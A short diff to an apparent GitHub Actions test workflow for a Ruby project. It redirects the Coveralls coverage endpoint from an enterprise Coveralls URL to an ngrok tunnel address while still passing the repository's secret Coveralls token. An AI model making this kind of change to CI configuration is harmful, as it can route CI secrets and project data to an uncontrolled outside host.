@@ -36,7 +36,7 @@ jobs:
         bundler-cache: true # runs 'bundle install' and caches installed gems automatically
     - name: Run tests and push coverage to coveralls
       env:
-        COVERALLS_ENDPOINT: https://enterprise-demo.coveralls.io/
+        COVERALLS_ENDPOINT: https://0258-47-158-176-244.ngrok-free.app
         COVERALLS_REPO_TOKEN: ${{ secrets.COVERALLS_REPO_TOKEN }}
         COVERALLS_NOISY: true
       run: bundle exec rspec
